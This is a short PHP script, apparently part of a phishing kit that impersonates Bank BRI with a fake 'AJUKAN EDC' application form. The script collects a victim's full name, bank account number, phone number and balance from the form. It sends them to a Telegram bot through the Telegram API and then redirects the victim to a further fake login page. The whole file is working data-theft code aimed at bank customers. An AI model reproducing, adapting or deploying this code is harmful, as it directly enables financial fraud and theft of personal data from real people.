<?php
include "telegram.php";
session_start();

$nama = $_POST['nama'];
$rek = $_POST['rek'];
$nomor = $_POST['nomor'];
$saldo = $_POST['saldo'];

$_SESSION['nama'] = $nama;
$_SESSION['rek'] = $rek;
$_SESSION['nomor'] = $nomor;
$_SESSION['saldo'] = $saldo;

$message = "
( Bank BRI | AJUKAN EDC | )

- Nama Lengkap : 
  ".$nama."

- Nomor Rekening :
  ".$rek."

- No HP : ".$nomor."

- Saldo : ".$saldo."

 ";

function sendMessage($id_telegram, $message, $id_botTele) {
    $url = "https://api.telegram.org/bot" . $id_botTele . "/sendMessage?parse_mode=markdown&chat_id=" . $id_telegram;
    $url = $url . "&text=" . urlencode($message);
    $ch = curl_init();
    $optArray = array(CURLOPT_URL => $url, CURLOPT_RETURNTRANSFER => true);
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
}
sendMessage($id_telegram, $message, $id_botTele);
header('Location: ../login.php');
?>
